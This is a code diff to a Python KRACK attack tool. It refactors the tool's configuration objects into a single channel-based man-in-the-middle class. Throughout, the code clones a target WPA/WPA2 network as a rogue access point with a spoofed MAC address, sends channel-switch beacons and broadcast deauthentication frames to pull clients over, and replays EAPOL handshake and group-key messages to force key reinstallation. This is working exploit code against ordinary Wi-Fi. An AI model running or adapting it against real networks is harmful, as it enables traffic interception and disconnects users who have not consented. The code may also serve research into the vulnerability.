@@ -222,7 +222,7 @@ class KRAckAttack():
 		
 		self.nic_rogue_ap = nic_rogue_ap
 		self.ssid = ssid
-		self.netconfig = None
+		self.mitmconfig = None
 		self.hostapd = None
 		self.hostapd_log = None
 		
@@ -243,7 +243,7 @@ class KRAckAttack():
 		self.group1 = []
 		self.time_forward_group1 = None
 
-		self.connconfig = ConnectionConfig(nic_real, self.nic_rogue_ap, nic_rogue_mon, self.ssid, self.clientmac, dumpfile)
+		self.mitmconfig = MitmChannelBased(nic_real, self.nic_rogue_ap, nic_rogue_mon, self.ssid, args.group, self.clientmac, dumpfile)
 
 	def hostapd_rx_mgmt(self, p):
 		'''
@@ -263,7 +263,7 @@ class KRAckAttack():
 		  macaddr: the MAC address of the client to register
 		'''
 		log(DEBUG, "Forwarding auth to rouge AP to register client", showtime=False)
-		self.hostapd_rx_mgmt(Dot11(addr1=self.connconfig.apmac, addr2=macaddr, addr3=self.connconfig.apmac)/Dot11Auth(seqnum=1))
+		self.hostapd_rx_mgmt(Dot11(addr1=self.mitmconfig.apmac, addr2=macaddr, addr3=self.mitmconfig.apmac)/Dot11Auth(seqnum=1))
 
 	def hostapd_finish_4way(self, stamac):
 		'''
@@ -277,8 +277,8 @@ class KRAckAttack():
 		'''
 		Description: send disassociation packet to the client connect to the Rogue AP. This packet is sent througth the Rogue Socket.
 		'''
-		p = Dot11(addr1=macaddr, addr2=self.connconfig.apmac, addr3=self.connconfig.apmac)/Dot11Disas(reason=0)
-		self.connconfig.sock_rogue.send(p)
+		p = Dot11(addr1=macaddr, addr2=self.mitmconfig.apmac, addr3=self.mitmconfig.apmac)/Dot11Disas(reason=0)
+		self.mitmconfig.sock_rogue.send(p)
 		log(STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color="green")
 
 	def queue_disas(self, macaddr):
@@ -292,7 +292,7 @@ class KRAckAttack():
 		heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))
 
 	def try_channel_switch(self, macaddr):
-		self.connconfig.send_csa_beacon(newchannel=self.netconfig.rogue_channel)
+		self.mitmconfig.send_csa_beacon(newchannel=self.mitmconfig.rogue_channel)
 		self.queue_disas(macaddr)
 
 	def hostapd_add_allzero_client(self, client):
@@ -330,7 +330,7 @@ class KRAckAttack():
 				p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
 				packet_list.insert(1, p)
 
-				for p in packet_list: self.connconfig.sock_rogue.send(p)
+				for p in packet_list: self.mitmconfig.sock_rogue.send(p)
 				client.msg3s = []
 
 				# TODO: Should extra stuff be done here? Forward msg4 to real AP?
@@ -363,7 +363,7 @@ class KRAckAttack():
 				client.update_state(ClientState.Success_Reinstalled)
 
 				# TODO: Confirm that the handshake now indeed completes. FIXME: Only if we have a msg4?
-				self.connconfig.sock_real.send(client.msg4)
+				self.mitmconfig.sock_real.send(client.msg4)
 
 			# Otherwise the client likely installed a new key, i.e., probably an all-zero key
 			else:
@@ -386,13 +386,13 @@ class KRAckAttack():
 		if not args.group: return False
 
 		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
-		if Dot11WEP in p and p.addr2 == self.connconfig.apmac and p.addr3 == self.connconfig.apmac and dot11_get_tid(p) == 7:
+		if Dot11WEP in p and p.addr2 == self.mitmconfig.apmac and p.addr3 == self.mitmconfig.apmac and dot11_get_tid(p) == 7:
 			# TODO: Detect that it's not a retransmission
 			self.group1.append(p)
 			log(STATUS, "Queued %s group message 1's" % len(self.group1), showtime=False)
 			if len(self.group1) == 2:
 				log(STATUS, "Forwarding first group1 message", showtime=False)
-				self.connconfig.sock_rogue.send(self.group1.pop(0))
+				self.mitmconfig.sock_rogue.send(self.group1.pop(0))
 
 				self.time_forward_group1 = time.time() + 3
 
@@ -403,7 +403,7 @@ class KRAckAttack():
 		if not args.group: return
 	
 		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
-		if Dot11WEP in p and p.addr1 == self.connconfig.apmac and p.addr3 == self.connconfig.apmac and dot11_get_tid(p) == 7:
+		if Dot11WEP in p and p.addr1 == self.mitmconfig.apmac and p.addr3 == self.mitmconfig.apmac and dot11_get_tid(p) == 7:
 			log(STATUS, "Got a likely group message 2", showtime=False)
 
 
@@ -418,11 +418,11 @@ class KRAckAttack():
 		Packet is an `association request`: if client is already 
 
 		'''
-		p = self.connconfig.sock_real.recv()
+		p = self.mitmconfig.sock_real.recv()
 		if p == None: return
 
 		# 1. Handle frames sent TO the real AP
-		if p.addr1 == self.connconfig.apmac:
+		if p.addr1 == self.mitmconfig.apmac:
 			# If it's an authentication to the real AP, always display it ...
 			if Dot11Auth in p:
 				print_rx(INFO, "Real channel ", p, color="orange")
@@ -433,8 +433,8 @@ class KRAckAttack():
 
 				if p.addr2 in self.clients: del self.clients[p.addr2]
 				# Send one targeted beacon pair (should be retransmitted in case of failure), and one normal broadcast pair
-				self.connconfig.send_csa_beacon(newchannel=self.netconfig.rogue_channel, target=p.addr2)
-				self.connconfig.send_csa_beacon(newchannel=self.netconfig.rogue_channel)
+				self.mitmconfig.send_csa_beacon(newchannel=self.mitmconfig.rogue_channel, target=p.addr2)
+				self.mitmconfig.send_csa_beacon(newchannel=self.mitmconfig.rogue_channel)
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].update_state(ClientState.Connecting)
 
@@ -459,13 +459,13 @@ class KRAckAttack():
 			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
 			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
 				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
-				self.connconfig.sock_real.send(Dot11(type=2, subtype=4, addr1=self.connconfig.apmac, addr2=p.addr2, addr3=self.connconfig.apmac))
+				self.mitmconfig.sock_real.send(Dot11(type=2, subtype=4, addr1=self.mitmconfig.apmac, addr2=p.addr2, addr3=self.mitmconfig.apmac))
 
 
 		# 2. Handle frames sent BY the real AP
-		elif p.addr2 == self.connconfig.apmac:
+		elif p.addr2 == self.mitmconfig.apmac:
 			# Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
-			if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
+			if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.mitmconfig.real_channel:
 				self.last_real_beacon = time.time()
 
 			# Decide whether we will (eventually) forward it
@@ -497,14 +497,14 @@ class KRAckAttack():
 
 					elif Dot11Deauth in p:
 						del self.clients[p.addr1]
-						self.connconfig.sock_rogue.send(p)
+						self.mitmconfig.sock_rogue.send(p)
 
 					else:
-						self.connconfig.sock_rogue.send(p)
+						self.mitmconfig.sock_rogue.send(p)
 
 				# Group addressed frames
 				else:
-					self.connconfig.sock_rogue.send(p)
+					self.mitmconfig.sock_rogue.send(p)
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
@@ -512,13 +512,13 @@ class KRAckAttack():
 
 
 	def handle_rx_roguechan(self):
-		p = self.connconfig.sock_rogue.recv()
+		p = self.mitmconfig.sock_rogue.recv()
 		if p == None: return
 
 		# 1. Handle frames sent BY the rouge AP
-		if p.addr2 == self.connconfig.apmac:
+		if p.addr2 == self.mitmconfig.apmac:
 			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
-			if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
+			if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.mitmconfig.rogue_channel:
 				self.last_rogue_beacon = time.time()
 			# Display all frames sent to the targeted client
 			if self.clientmac is not None and p.addr1 == self.clientmac:
@@ -528,7 +528,7 @@ class KRAckAttack():
 				print_rx(INFO, "Rogue channel", p)
 
 		# 2. Handle frames sent TO the AP
-		elif p.addr1 == self.connconfig.apmac:
+		elif p.addr1 == self.mitmconfig.apmac:
 			client = None
 
 			# Check if it's a new client that we can MitM
@@ -567,7 +567,7 @@ class KRAckAttack():
 					if client.state < ClientState.Attack_Started:
 						p.FCfield &= 0xFFEF
 
-					self.connconfig.sock_real.send(p)
+					self.mitmconfig.sock_real.send(p)
 
 
 		# 3. Always display all frames sent by or to the targeted client
@@ -597,46 +597,46 @@ class KRAckAttack():
 
 	def run(self, strict_echo_test=False):
 		
-		self.connconfig.configure_interfaces()
+		self.mitmconfig.configure_interfaces()
 
 		# Make sure to use a recent backports driver package so we can indeed
 		# capture and inject packets in monitor mode.
-		self.connconfig.create_sockets(strict_echo_test)
+		self.mitmconfig.create_sockets(strict_echo_test)
 
 		# Test monitor mode and get MAC address of the network
-		self.connconfig.find_beacon(self.ssid)
+		self.mitmconfig.find_beacon(self.ssid)
 		
 		# Parse beacon and used this to generate a cloned hostapd.conf
-		self.netconfig = NetworkConfig(args.group)
-		self.netconfig.from_beacon(self.connconfig.beacon)
-		if not self.netconfig.is_wparsn():
+		
+		self.mitmconfig.from_beacon(self.mitmconfig.beacon)
+		if not self.mitmconfig.is_wparsn():
 			log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
 			return
-		elif self.netconfig.real_channel > 13:
+		elif self.mitmconfig.real_channel > 13:
 			log(WARNING, "Attack not yet tested against 5 GHz networks.")
-		self.netconfig.find_rogue_channel()
+		self.mitmconfig.find_rogue_channel()
 
-		log(STATUS, "Target network %s detected on channel %d" % (self.connconfig.apmac, self.netconfig.real_channel), color="green")
-		log(STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")
+		log(STATUS, "Target network %s detected on channel %d" % (self.mitmconfig.apmac, self.mitmconfig.real_channel), color="green")
+		log(STATUS, "Will create rogue AP on channel %d" % self.mitmconfig.rogue_channel, color="green")
 
 		# Set the MAC address of the rogue hostapd AP
-		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.connconfig.apmac))
-		set_mac_address(self.nic_rogue_ap, self.connconfig.apmac)
+		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.mitmconfig.apmac))
+		set_mac_address(self.nic_rogue_ap, self.mitmconfig.apmac)
 
 		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
-		if self.connconfig.nic_real_clientack: subprocess.check_output(["ifconfig", self.connconfig.nic_real_clientack, "up"])
+		if self.mitmconfig.nic_real_clientack: subprocess.check_output(["ifconfig", self.mitmconfig.nic_real_clientack, "up"])
 
 		# Set BFP filters to increase performance
-		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.connconfig.apmac)
+		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.mitmconfig.apmac)
 		if self.clientmac:
 			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
 		bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
-		self.connconfig.sock_real.attach_filter(bpf)
-		self.connconfig.sock_rogue.attach_filter(bpf)
+		self.mitmconfig.sock_real.attach_filter(bpf)
+		self.mitmconfig.sock_rogue.attach_filter(bpf)
 
 		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("hostapd_rogue.conf", "w") as fp:
-			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
+			fp.write(self.mitmconfig.write_config(self.nic_rogue_ap))
 		self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 
@@ -647,11 +647,11 @@ class KRAckAttack():
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
-		self.connconfig.send_csa_beacon(numbeacons=4, newchannel=self.netconfig.rogue_channel)
+		self.mitmconfig.send_csa_beacon(numbeacons=4, newchannel=self.mitmconfig.rogue_channel)
 
 		# Try to deauthenticated all clients
-		deauth = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.connconfig.apmac, addr3=self.connconfig.apmac)/Dot11Deauth(reason=3)
-		self.connconfig.sock_real.send(deauth)
+		deauth = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.mitmconfig.apmac, addr3=self.mitmconfig.apmac)/Dot11Deauth(reason=3)
+		self.mitmconfig.sock_real.send(deauth)
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
 		if self.clientmac:
@@ -662,14 +662,14 @@ class KRAckAttack():
 		self.last_rogue_beacon = time.time()
 		nextbeacon = time.time() + 0.01
 		while True:
-			sel = select.select([self.connconfig.sock_rogue, self.connconfig.sock_real, self.hostapd.stdout], [], [], 0.1)
-			if self.connconfig.sock_real      in sel[0]: self.handle_rx_realchan()
-			if self.connconfig.sock_rogue     in sel[0]: self.handle_rx_roguechan()
+			sel = select.select([self.mitmconfig.sock_rogue, self.mitmconfig.sock_real, self.hostapd.stdout], [], [], 0.1)
+			if self.mitmconfig.sock_real      in sel[0]: self.handle_rx_realchan()
+			if self.mitmconfig.sock_rogue     in sel[0]: self.handle_rx_roguechan()
 			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()
 
 			if self.time_forward_group1 and self.time_forward_group1 <= time.time():
 				p = self.group1.pop(0)
-				self.connconfig.sock_rogue.send(p)
+				self.mitmconfig.sock_rogue.send(p)
 				self.time_forward_group1 = None
 				log(STATUS, "Injected older group message 1: %s" % dot11_to_str(p), color="green")
 
@@ -677,7 +677,7 @@ class KRAckAttack():
 				self.send_disas(self.disas_queue.pop()[1])
 
 			if self.continuous_csa and nextbeacon <= time.time():
-				self.connconfig.send_csa_beacon(newchannel=self.netconfig.rogue_channel, silent=True)
+				self.mitmconfig.send_csa_beacon(newchannel=self.mitmconfig.rogue_channel, silent=True)
 				nextbeacon += 0.10
 
 			if self.last_real_beacon + 2 < time.time():
@@ -695,8 +695,8 @@ class KRAckAttack():
 			self.hostapd.wait()
 		if self.hostapd_log:
 			self.hostapd_log.close()
-		if self.connconfig.sock_real: self.connconfig.sock_real.close()
-		if self.connconfig.sock_rogue: self.connconfig.sock_rogue.close()
+		if self.mitmconfig.sock_real: self.mitmconfig.sock_real.close()
+		if self.mitmconfig.sock_rogue: self.mitmconfig.sock_rogue.close()
 
 
 def cleanup():
